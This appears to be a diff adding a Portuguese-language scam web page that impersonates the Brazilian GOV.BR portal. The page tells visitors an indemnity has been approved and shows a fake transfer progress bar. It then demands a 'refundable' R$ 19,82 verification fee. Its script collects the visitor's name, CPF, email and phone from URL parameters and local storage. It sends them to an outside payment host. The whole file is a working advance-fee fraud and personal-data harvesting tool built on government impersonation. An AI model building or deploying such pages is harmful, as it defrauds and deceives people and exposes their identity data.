@@ -1,0 +1,926 @@
+<!DOCTYPE html><html lang="pt-BR" class="light" style="color-scheme: light;"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Consulta Governamental - Verificação de Direitos</title>
+  <meta name="description" content="Verifique seus direitos e consulte informações governamentais de forma segura e oficial.">
+  <meta name="author" content="Consulta Governamental">
+  <meta name="keywords" content="consulta, governo, direitos, verificação, oficial">
+  <meta name="robots" content="index, follow">
+  <meta property="og:title" content="Consulta Governamental - Verificação de Direitos">
+  <meta property="og:description" content="Verifique seus direitos e consulte informações governamentais de forma segura e oficial.">
+  <meta property="og:type" content="website">
+  
+  <script>
+    localStorage.setItem("upsell", "up2");
+  </script>
+    
+  <script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-xcod-sck
+    data-utmify-prevent-subids
+    async
+    defer
+  ></script>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <link rel="icon" href="../04/images/favicon.ico" sizes="any">
+
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            govblue: {
+              light: "#4f9cf9",
+              DEFAULT: "#3b82f6",
+              dark: "#1e40af",
+            },
+          },
+          fontFamily: {
+            'inter': ['Inter', 'Arial', 'sans-serif'],
+          },
+        },
+      },
+    };
+  </script>
+
+  <style>
+    body {
+      font-family: "Inter", "Arial", sans-serif;
+      background: linear-gradient(135deg, #f8fafc 0%, #dbeafe 50%, #e0e7ff 100%);
+      margin: 0;
+      padding: 0;
+      min-height: 100vh;
+    }
+
+    .gov-gradient {
+      background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
+    }
+
+    .container-main {
+      min-height: 100vh;
+      background: linear-gradient(135deg, #f8fafc 0%, #dbeafe 50%, #e0e7ff 100%);
+    }
+
+    .header-fixed {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      z-index: 50;
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(8px);
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
+      border-bottom: 1px solid #e5e7eb;
+    }
+
+    .gov-card {
+      max-width: 28rem;
+      margin: 0 auto;
+      background: white;
+      border-radius: 1rem;
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+      border: 1px solid #f3f4f6;
+      overflow: hidden;
+    }
+
+    .card-header {
+      background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
+      color: white;
+      padding: 1rem 1.5rem;
+      text-align: center;
+    }
+
+    .success-icon {
+      width: 4rem;
+      height: 4rem;
+      background: linear-gradient(135deg, #10b981 0%, #34d399 100%);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 1rem;
+      box-shadow: 0 8px 25px rgba(16, 185, 129, 0.25);
+    }
+
+    .success-icon i {
+      color: white;
+      font-size: 1.5rem;
+    }
+
+    .title {
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: #1f2937;
+      text-align: center;
+      margin-bottom: 0.5rem;
+      font-family: 'Inter', sans-serif;
+    }
+
+    .subtitle {
+      color: #6b7280;
+      text-align: center;
+      margin-bottom: 1.5rem;
+      font-size: 0.9rem;
+    }
+
+    .amount {
+      font-size: 2.25rem;
+      font-weight: 800;
+      color: #3b82f6;
+      text-align: center;
+      margin-bottom: 1.5rem;
+      font-family: 'Inter', sans-serif;
+    }
+
+    .info-grid {
+      display: grid;
+      gap: 0.75rem;
+      margin-bottom: 1.5rem;
+    }
+
+    .info-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 0.75rem 0;
+      border-bottom: 1px solid #f3f4f6;
+      font-size: 0.95rem;
+    }
+
+    .info-row:last-child {
+      border-bottom: none;
+    }
+
+    .info-label {
+      color: #6b7280;
+      font-weight: 500;
+    }
+
+    .info-value {
+      color: #1f2937;
+      font-weight: 600;
+    }
+
+    .alert-info {
+      background-color: #dbeafe;
+      border-left: 4px solid #3b82f6;
+      padding: 1rem;
+      margin: 1.5rem 0;
+      border-radius: 0.5rem;
+      font-size: 0.9rem;
+      color: #1e40af;
+    }
+
+    .alert-warning {
+      background-color: #fef3c7;
+      border-left: 4px solid #f59e0b;
+      padding: 1rem;
+      margin: 1.5rem 0;
+      border-radius: 0.5rem;
+      font-size: 0.9rem;
+      color: #92400e;
+    }
+
+    .alert-danger {
+      background-color: #fee2e2;
+      border-left: 4px solid #ef4444;
+      padding: 1rem;
+      margin: 1.5rem 0;
+      border-radius: 0.5rem;
+      font-size: 0.9rem;
+      color: #dc2626;
+      font-weight: 600;
+    }
+
+    .button-primary {
+      width: 100%;
+      background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
+      color: white;
+      border: none;
+      border-radius: 0.75rem;
+      padding: 1rem;
+      font-size: 1rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+      font-family: 'Inter', sans-serif;
+      box-shadow: 0 4px 14px 0 rgba(59, 130, 246, 0.25);
+    }
+
+    .button-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 25px rgba(59, 130, 246, 0.4);
+      background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
+    }
+
+    .button-primary:active {
+      transform: translateY(0);
+    }
+
+    .btn-shine {
+      position: relative;
+      overflow: hidden;
+    }
+
+    .btn-shine:after {
+      content: "";
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(
+        to right,
+        rgba(255, 255, 255, 0) 0%,
+        rgba(255, 255, 255, 0.3) 50%,
+        rgba(255, 255, 255, 0) 100%
+      );
+      transform: rotate(30deg);
+      animation: shine 4s infinite;
+    }
+
+    @keyframes shine {
+      0% { left: -100%; opacity: 0; }
+      10% { left: 100%; opacity: 0.6; }
+      100% { left: 100%; opacity: 0; }
+    }
+
+    .progress-container {
+      margin: 2rem 0;
+      text-align: center;
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 8px;
+      background-color: #e5e7eb;
+      border-radius: 4px;
+      overflow: hidden;
+      margin-bottom: 1rem;
+    }
+
+    .progress-bar-fill {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
+      transition: width 0.1s linear;
+    }
+
+    .status-text {
+      font-size: 1.25rem;
+      font-weight: 600;
+      color: #1f2937;
+      margin-bottom: 1rem;
+      font-family: 'Inter', sans-serif;
+    }
+
+    .alerts-container {
+      background-color: #f9fafb;
+      padding: 1rem;
+      border-radius: 1rem;
+      min-height: 360px;
+      display: grid;
+      gap: 1rem;
+    }
+
+    .alert-item {
+      background: white;
+      border-radius: 0.75rem;
+      padding: 1rem;
+      display: none;
+      align-items: center;
+      gap: 0.75rem;
+      font-size: 0.95rem;
+      color: #374151;
+      opacity: 0;
+      transform: translateY(10px);
+      animation: fadeInUp 0.3s ease forwards;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+    }
+
+    .alert-item.red {
+      background: #ef4444;
+      color: white;
+      font-weight: 600;
+    }
+
+    @keyframes fadeInUp {
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .icon-img {
+      width: 2rem;
+      height: 2rem;
+      flex-shrink: 0;
+    }
+
+    .spinner {
+      border: 3px solid #e5e7eb;
+      border-top: 3px solid #3b82f6;
+      border-radius: 50%;
+      width: 32px;
+      height: 32px;
+      animation: spin 0.8s linear infinite;
+      margin: 2rem auto;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .card, .loading-card, .final-card {
+      display: none;
+      opacity: 0;
+      transform: translateY(20px);
+      transition: opacity 0.5s ease, transform 0.5s ease;
+    }
+
+    .card.active, .loading-card.active, .final-card.active {
+      display: block;
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    .fade-out-up { 
+      opacity: 0; 
+      transform: translateY(-20px); 
+      transition: all 0.4s ease;
+    }
+    
+    .fade-in-up { 
+      opacity: 1; 
+      transform: translateY(0); 
+      transition: all 0.4s ease;
+    }
+
+    /* Utility classes matching the gov design */
+    .flex { display: flex; }
+    .items-center { align-items: center; }
+    .justify-center { justify-content: center; }
+    .justify-between { justify-content: space-between; }
+    .mr-2 { margin-right: 0.5rem; }
+    .mb-4 { margin-bottom: 1rem; }
+    .w-16 { width: 4rem; }
+    .h-16 { height: 4rem; }
+    .bg-yellow-100 { background-color: #fef3c7; }
+    .rounded-full { border-radius: 9999px; }
+    .text-yellow-600 { color: #d97706; }
+    .text-2xl { font-size: 1.5rem; }
+    .text-gray-600 { color: #6b7280; }
+    .text-sm { font-size: 0.875rem; }
+    .text-xs { font-size: 0.75rem; }
+    .space-x-2 > * + * { margin-left: 0.5rem; }
+    .space-x-3 > * + * { margin-left: 0.75rem; }
+  </style>
+</head>
+<body class="font-inter">
+  <div class="container-main">
+    <!-- Header Governamental -->
+    <header class="header-fixed">
+      <div class="px-4 py-2">
+        <div class="flex justify-between items-center">
+          <div class="flex items-center space-x-3">
+            <img alt="Logo GOV.BR" class="h-6 w-auto" src="../04/images/Gov-br-logo-svg.png">
+            <div class="hidden sm:block h-5 w-px bg-gray-300"></div>
+            <span class="hidden sm:inline text-xs font-medium text-gray-600">Portal Oficial</span>
+          </div>
+          <div class="flex items-center space-x-3">
+            <div class="flex items-center space-x-1 text-xs text-gray-500">
+              <svg class="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
+                <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path>
+              </svg>
+              <span class="hidden sm:inline">Seguro</span>
+            </div>
+            <button class="flex items-center space-x-2 bg-blue-600 hover:bg-blue-700 text-white px-3 py-1.5 rounded-full transition-colors text-sm">
+              <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
+                <path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd"></path>
+              </svg>
+              <span class="font-medium" id="user-display-name">Carregando...</span>
+            </button>
+          </div>
+        </div>
+      </div>
+    </header>
+
+    <!-- Espaçamento do header fixo -->
+    <div class="h-16"></div>
+
+    <!-- Conteúdo principal -->
+    <main class="pt-6 pb-8 px-4">
+      <div class="max-w-md mx-auto">
+        <!-- CARD INICIAL -->
+        <div class="card active" id="card">
+          <div class="gov-card">
+            <div class="card-header">
+              <div class="flex items-center justify-center space-x-2 mb-2">
+                <svg fill="currentColor" viewBox="0 0 20 20" class="w-4 h-4 sm:w-5 sm:h-5">
+                  <path d="M2 6a2 2 0 012-2h6l2 2h6a2 2 0 012 2v6a2 2 0 01-2 2H4a2 2 0 01-2-2V6z"></path>
+                </svg>
+                <span class="font-bold text-xs sm:text-sm">INDENIZAÇÃO APROVADA</span>
+              </div>
+              <p class="text-xs opacity-90">Sua indenização foi liberada com sucesso</p>
+            </div>
+            
+            <div class="p-4 sm:p-6">
+              <div class="success-icon">
+                <i class="fas fa-check"></i>
+              </div>
+              
+              <h1 class="title">Indenização Liberada!</h1>
+              <p class="subtitle">Sua indenização foi aprovada e está pronta para transferência via PIX</p>
+              
+              <div class="amount" id="valor-aprovado">R$ 5.960,50</div>
+              
+              <div class="info-grid">
+                <div class="info-row">
+                  <span class="info-label">Beneficiário</span>
+                  <span class="info-value" id="nome-completo">Carregando...</span>
+                </div>
+                <div class="info-row">
+                  <span class="info-label">CPF</span>
+                  <span class="info-value" id="cpf">Carregando CPF...</span>
+                </div>
+                <div class="info-row">
+                  <span class="info-label">Tipo de transferência</span>
+                  <span class="info-value">PIX Instantâneo</span>
+                </div>
+                <div class="info-row">
+                  <span class="info-label">Data de liberação</span>
+                  <span class="info-value" id="data">Carregando data...</span>
+                </div>
+              </div>
+
+              <div class="alert-info">
+                <div class="flex items-center">
+                  <i class="fas fa-info-circle mr-2"></i>
+                  <span>Sua indenização já está aprovada e liberada! Clique no botão abaixo para autorizar a transferência via PIX para sua conta bancária.</span>
+                </div>
+              </div>
+
+              <button class="button-primary btn-shine" onclick="iniciarTransferencia()">
+                <i class="fas fa-university mr-2"></i>
+                Receber minha indenização
+              </button>
+            </div>
+          </div>
+        </div>
+
+        <!-- TELA DE CARREGAMENTO -->
+        <div class="loading-card" id="loading">
+          <div class="gov-card">
+            <div class="card-header">
+              <div class="flex items-center justify-center space-x-2 mb-2">
+                <svg fill="currentColor" viewBox="0 0 20 20" class="w-4 h-4 sm:w-5 sm:h-5">
+                  <path d="M2 6a2 2 0 012-2h6l2 2h6a2 2 0 012 2v6a2 2 0 01-2 2H4a2 2 0 01-2-2V6z"></path>
+                </svg>
+                <span class="font-bold text-xs sm:text-sm">PROCESSANDO TRANSFERÊNCIA</span>
+              </div>
+              <p class="text-xs opacity-90">Aguarde, estamos processando sua solicitação</p>
+            </div>
+            
+            <div class="p-4 sm:p-6">
+              <div class="progress-container">
+                <h2 id="status-text" class="status-text">Processando transferência...</h2>
+                <div class="progress-bar">
+                  <div class="progress-bar-fill" id="bar"></div>
+                </div>
+                <p class="text-gray-600 text-sm">Aguarde enquanto processamos sua solicitação de transferência</p>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- CARD FINAL -->
+        <div class="final-card" id="card-final">
+          <div class="gov-card">
+            <div class="card-header">
+              <div class="flex items-center justify-center space-x-2 mb-2">
+                <svg fill="currentColor" viewBox="0 0 20 20" class="w-4 h-4 sm:w-5 sm:h-5">
+                  <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path>
+                </svg>
+                <span class="font-bold text-xs sm:text-sm">VERIFICAÇÃO NECESSÁRIA</span>
+              </div>
+              <p class="text-xs opacity-90">Segurança adicional requerida</p>
+            </div>
+            
+            <div class="p-4 sm:p-6">
+              <div class="flex items-center justify-center mb-4">
+                <div class="w-16 h-16 bg-yellow-100 rounded-full flex items-center justify-center">
+                  <i class="fas fa-exclamation-triangle text-yellow-600 text-2xl"></i>
+                </div>
+              </div>
+              
+              <h1 class="title" style="color: #f59e0b;">Verificação de Segurança</h1>
+              <p class="subtitle">Para sua proteção, precisamos verificar esta transferência de alto valor</p>
+
+              <div class="alerts-container" id="alerts-container">
+                <!-- Os alertas serão inseridos aqui dinamicamente -->
+              </div>
+
+              <button class="button-primary btn-shine" onclick="redirecionarParaPagamento()">
+                <i class="fas fa-shield-alt mr-2"></i>
+                Pagar Taxa de Verificação
+              </button>
+              
+              <div class="text-center mt-3">
+                <p class="text-xs text-gray-400">🔒 Ambiente seguro e certificado</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </main>
+  </div>
+
+  <!--
+    Esta página deve ser acessada com os seguintes parâmetros de URL:
+    - name/nome: Nome do usuário (exibirá "Carregando..." se não encontrado)
+    - document/cpf: CPF do usuário (exibirá "Carregando..." se não encontrado)
+    - email: Email do usuário
+    - telephone/telefone: Telefone do usuário
+    - valor_emprestimo: Faixa de valor escolhida na página anterior (500-1000, 1001-3000, 3001-5000, acima5000)
+      * Se não informado, será usado o valor padrão: R$ 9.782,23
+    
+    Exemplo: up1/index.html?name=João Silva&document=12345678901&email=joao@email.com&valor_emprestimo=1001-3000
+    Ou: up1/index.html?nome=João Silva&cpf=12345678901&email=joao@email.com&valor_emprestimo=1001-3000
+  -->
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    
+    // Função para salvar dados importantes no localStorage
+    function salvarDadosLocalStorage(nome, cpf, valorEmprestimo) {
+      if (nome && nome.trim() !== "") {
+        localStorage.setItem("userNome", nome);
+      }
+      if (cpf && cpf.trim() !== "") {
+        localStorage.setItem("userCpf", cpf);
+      }
+      if (valorEmprestimo && valorEmprestimo.trim() !== "") {
+        localStorage.setItem("userValorEmprestimo", valorEmprestimo);
+      }
+    }
+
+    // Função para recuperar dados do localStorage
+    function recuperarDadosLocalStorage() {
+      return {
+        nome: localStorage.getItem("userNome") || localStorage.getItem("nomeUsuario") || "",
+        cpf: localStorage.getItem("userCpf") || localStorage.getItem("cpfUsuario") || "",
+        valorEmprestimo: localStorage.getItem("userValorEmprestimo") || "",
+        dataNascimento: localStorage.getItem("userDataNascimento") || "",
+        nomeMae: localStorage.getItem("userNomeMae") || "",
+        sexo: localStorage.getItem("userSexo") || ""
+      };
+    }
+    
+    // Função para recuperar dados completos da API se disponíveis
+    function recuperarDadosAPI() {
+      const dadosUsuarioJSON = localStorage.getItem("dadosUsuario");
+      if (dadosUsuarioJSON) {
+        try {
+          return JSON.parse(dadosUsuarioJSON);
+        } catch (error) {
+          console.log("Erro ao parse dos dados da API:", error);
+          return null;
+        }
+      }
+      return null;
+    }
+    
+    // Capturar nome com múltiplas variações possíveis e fallbacks
+    let nome = params.get("nome") || params.get("name") || params.get("usuario") || "";
+    
+    // Capturar CPF com fallback para localStorage
+    let cpf = params.get("cpf") || params.get("document") || "";
+    
+    // Capturar valor do empréstimo com fallback para localStorage
+    let valorEmprestimo = params.get("valor_emprestimo") || params.get("valor_aprovado") || "";
+    
+    // Se algum dado estiver vazio, tentar recuperar do localStorage
+    const dadosLocalStorage = recuperarDadosLocalStorage();
+    const dadosAPI = recuperarDadosAPI();
+    
+    // Priorizar dados da API se disponíveis
+    if (!nome || nome.trim() === "") {
+      if (dadosAPI && dadosAPI.nome) {
+        nome = dadosAPI.nome;
+        console.log("Nome recuperado da API:", nome);
+      } else if (dadosLocalStorage.nome) {
+        nome = dadosLocalStorage.nome;
+        console.log("Nome recuperado do localStorage:", nome);
+      }
+    }
+    
+    // Se ainda não tiver nome válido, usar valor padrão
+    if (!nome || nome.trim() === "") {
+      nome = "Usuário";
+    }
+    
+    if (!cpf || cpf.trim() === "") {
+      if (dadosAPI && dadosAPI.cpf) {
+        cpf = dadosAPI.cpf;
+        console.log("CPF recuperado da API:", cpf);
+      } else if (dadosLocalStorage.cpf) {
+        cpf = dadosLocalStorage.cpf;
+        console.log("CPF recuperado do localStorage:", cpf);
+      }
+    }
+    
+    if (!valorEmprestimo || valorEmprestimo.trim() === "") {
+      valorEmprestimo = dadosLocalStorage.valorEmprestimo;
+      console.log("Valor do empréstimo recuperado do localStorage:", valorEmprestimo);
+    }
+    
+    // Salvar dados atuais no localStorage para uso futuro (garantir consistência)
+    salvarDadosLocalStorage(nome, cpf, valorEmprestimo);
+    
+    // Se temos dados da API, salvar também separadamente para compatibilidade
+    if (dadosAPI) {
+      if (dadosAPI.nome && !localStorage.getItem("nomeUsuario")) {
+        localStorage.setItem("nomeUsuario", dadosAPI.nome);
+      }
+      if (dadosAPI.cpf && !localStorage.getItem("cpfUsuario")) {
+        localStorage.setItem("cpfUsuario", dadosAPI.cpf);
+      }
+    }
+    
+    const email = params.get("email") || "";
+    const telefone = params.get("numero") || params.get("telephone") || params.get("telefone") || "";
+    
+    // Debug: log dos parâmetros para verificação
+    console.log("=== UP1 - DEBUG DOS PARÂMETROS ===");
+    console.log("URL atual:", window.location.href);
+    console.log("Parâmetros da URL:", {
+      nome: params.get("nome") || params.get("name"),
+      cpf: params.get("cpf") || params.get("document"),
+      valorEmprestimo: params.get("valor_emprestimo") || params.get("valor_aprovado")
+    });
+    console.log("Dados do localStorage:", dadosLocalStorage);
+    console.log("Dados da API:", dadosAPI);
+    console.log("Dados finais utilizados:", {
+      nome: nome,
+      cpf: cpf,
+      email: email,
+      telefone: telefone,
+      valorEmprestimo: valorEmprestimo
+    });
+    console.log("Todos os parâmetros URL:", Object.fromEntries(params));
+    console.log("==================================");
+
+    // Função para formatar valor monetário
+    function formatarValor(valor) {
+      const numero = parseFloat(valor);
+      if (isNaN(numero)) return "R$ 5.960,50"; // valor padrão
+      return `R$ ${numero.toLocaleString('pt-BR', {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2
+      })}`;
+    }
+
+    // Obter valor formatado do empréstimo (usando o valor exato digitado pelo usuário)
+    const valorFormatado = formatarValor(valorEmprestimo);
+
+    function formatCPF(cpf) {
+      const clean = cpf.replace(/\D/g, "");
+      return clean.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+    }
+
+    function getFormattedDate() {
+      const d = new Date();
+      return `${String(d.getDate()).padStart(2, '0')}/${String(d.getMonth() + 1).padStart(2, '0')}/${d.getFullYear()}`;
+    }
+
+    // Atualizar informações do usuário no header e no card
+    document.addEventListener('DOMContentLoaded', function() {
+      // Função para atualizar dados na tela com fallbacks robustos
+      function atualizarDadosNaTela() {
+        // Obter dados mais recentes
+        const dadosRecentes = recuperarDadosLocalStorage();
+        const dadosAPIRecentes = recuperarDadosAPI();
+        
+        // Determinar nome final com prioridade para API
+        let nomeFinal = nome;
+        if (dadosAPIRecentes && dadosAPIRecentes.nome) {
+          nomeFinal = dadosAPIRecentes.nome;
+        } else if (dadosRecentes.nome) {
+          nomeFinal = dadosRecentes.nome;
+        }
+        
+        // Determinar CPF final com prioridade para API
+        let cpfFinal = cpf;
+        if (dadosAPIRecentes && dadosAPIRecentes.cpf) {
+          cpfFinal = dadosAPIRecentes.cpf;
+        } else if (dadosRecentes.cpf) {
+          cpfFinal = dadosRecentes.cpf;
+        }
+
+        // Garantir que os elementos existem antes de tentar atualizar
+        const userDisplayName = document.getElementById("user-display-name");
+        const nomeCompleto = document.getElementById("nome-completo");
+        const cpfElement = document.getElementById("cpf");
+        const dataElement = document.getElementById("data");
+        const valorAprovado = document.getElementById("valor-aprovado");
+        
+        // Atualizar elementos se existirem
+        if (userDisplayName) userDisplayName.textContent = nomeFinal ? nomeFinal.split(' ')[0] : "Usuário";
+        if (nomeCompleto) nomeCompleto.textContent = nomeFinal || "Usuário";
+        if (cpfElement) cpfElement.textContent = cpfFinal ? formatCPF(cpfFinal) : "***.***.***-**";
+        if (dataElement) dataElement.textContent = getFormattedDate();
+        if (valorAprovado) valorAprovado.textContent = valorFormatado;
+        
+        console.log("Dados atualizados na tela:", {
+          nomeFinal: nomeFinal || "Usuário",
+          cpfFinal: cpfFinal ? formatCPF(cpfFinal) : "***.***.***-**",
+          valorFormatado: valorFormatado,
+          fonte: dadosAPIRecentes ? "API + localStorage" : "localStorage"
+        });
+      }
+      
+      // Executar atualização inicial
+      atualizarDadosNaTela();
+    });
+    
+    // Atualização imediata (fallback caso DOMContentLoaded já tenha passado)
+    if (document.readyState === 'loading') {
+      // Página ainda carregando, aguardar DOMContentLoaded
+    } else {
+      // Página já carregada, atualizar imediatamente
+      setTimeout(() => {
+        const userDisplayName = document.getElementById("user-display-name");
+        const nomeCompleto = document.getElementById("nome-completo");
+        const cpfElement = document.getElementById("cpf");
+        const dataElement = document.getElementById("data");
+        const valorAprovado = document.getElementById("valor-aprovado");
+        
+        if (userDisplayName) userDisplayName.textContent = nome ? nome.split(' ')[0] : "Usuário";
+        if (nomeCompleto) nomeCompleto.textContent = nome || "Usuário";
+        if (cpfElement) cpfElement.textContent = cpf ? formatCPF(cpf) : "***.***.***-**";
+        if (dataElement) dataElement.textContent = getFormattedDate();
+        if (valorAprovado) valorAprovado.textContent = valorFormatado;
+      }, 100);
+    }
+
+    function exibirAlertasComSpinner() {
+      const alerts = [
+        { 
+          icon: "./assets/10.svg", 
+          text: "Identificamos uma movimentação de valor alto suspeita!", 
+          red: false 
+        },
+        { 
+          icon: "./assets/11.svg", 
+          text: "Por motivos de segurança é preciso realizar o pagamento da Taxa de Verificação para garantir a transferência segura e evitar possíveis fraudes.", 
+          red: false 
+        },
+        { 
+          icon: "./assets/12.svg", 
+          text: "Finalize o pagamento da Taxa de Verificação no valor de <b>R$ 19,82</b> e confirme seu crédito. Essa taxa é reembolsável e será devolvida automaticamente após a confirmação do pagamento.", 
+          red: true 
+        },
+      ];
+      
+      const container = document.getElementById("alerts-container");
+      container.innerHTML = "";
+
+      let index = 0;
+      function showNext() {
+        if (index >= alerts.length) return;
+
+        // Mostrar spinner
+        const spinner = document.createElement("div");
+        spinner.className = "spinner";
+        container.appendChild(spinner);
+
+        setTimeout(() => {
+          // Remover spinner
+          container.removeChild(spinner);
+
+          // Criar e mostrar alerta
+          const alert = document.createElement("div");
+          alert.className = `alert-item${alerts[index].red ? " red" : ""}`;
+          
+          const icon = document.createElement("img");
+          icon.src = alerts[index].icon;
+          icon.className = "icon-img";
+
+          const text = document.createElement("div");
+          text.innerHTML = alerts[index].text;
+
+          alert.appendChild(icon);
+          alert.appendChild(text);
+          container.appendChild(alert);
+
+          // Mostrar com animação
+          requestAnimationFrame(() => {
+            alert.style.display = "flex";
+          });
+
+          index++;
+          setTimeout(showNext, 900);
+        }, 1200);
+      }
+
+      showNext();
+    }
+
+    function iniciarTransferencia() {
+
+      // Esconder card inicial
+      document.getElementById("card").classList.remove("active");
+      
+      // Mostrar loading
+      document.getElementById("loading").classList.add("active");
+
+      const bar = document.getElementById("bar");
+      const statusText = document.getElementById("status-text");
+      let progress = 0;
+      let statusChanged = false;
+
+      const interval = setInterval(() => {
+        if (progress >= 100) {
+          clearInterval(interval);
+          
+          // Esconder loading e mostrar card final
+          document.getElementById("loading").classList.remove("active");
+          document.getElementById("card-final").classList.add("active");
+          
+          // Iniciar exibição dos alertas
+          exibirAlertasComSpinner();
+        } else {
+          progress++;
+          bar.style.width = progress + "%";
+
+          // Trocar texto no meio do progresso
+          if (progress === 70 && !statusChanged) {
+            statusChanged = true;
+            statusText.classList.add("fade-out-up");
+            
+            setTimeout(() => {
+              statusText.textContent = "Gerando comprovante...";
+              statusText.classList.remove("fade-out-up");
+              statusText.classList.add("fade-in-up");
+              
+              setTimeout(() => {
+                statusText.classList.remove("fade-in-up");
+              }, 400);
+            }, 400);
+          }
+        }
+      }, 50);
+    }
+
+    function redirecionarParaPagamento() {
+
+      const urlBase = "https://pay.pagamentosfacilitadosoficial.shop/DYp0ZxVBYWkgmvX";
+      
+      // Criar novos parâmetros garantindo que todos os dados sejam passados
+      const checkoutParams = new URLSearchParams();
+      
+      // Adicionar parâmetros com múltiplas variações para garantir compatibilidade
+      if (nome && nome.trim() !== "") {
+        checkoutParams.set("name", nome);
+        checkoutParams.set("nome", nome);
+      }
+      
+      if (cpf && cpf.trim() !== "") {
+        checkoutParams.set("document", cpf);
+        checkoutParams.set("cpf", cpf);
+      }
+      
+      if (email) {
+        checkoutParams.set("email", email);
+      }
+      
+      if (telefone) {
+        checkoutParams.set("telephone", telefone);
+        checkoutParams.set("telefone", telefone);
+      }
+      
+      // Adicionar todos os parâmetros originais da URL atual
+      const currentParams = new URLSearchParams(window.location.search);
+      for (const [key, value] of currentParams) {
+        if (!checkoutParams.has(key)) {
+          checkoutParams.set(key, value);
+        }
+      }
+      
+      const finalUrl = `${urlBase}?${checkoutParams.toString()}`;
+      
+      console.log("Redirecionando para checkout com parâmetros:", checkoutParams.toString());
+      console.log("URL completa:", finalUrl);
+      
+      window.location.href = finalUrl;
+    }
+  </script>
+
+
+</div>
+</div>
+</body></html>
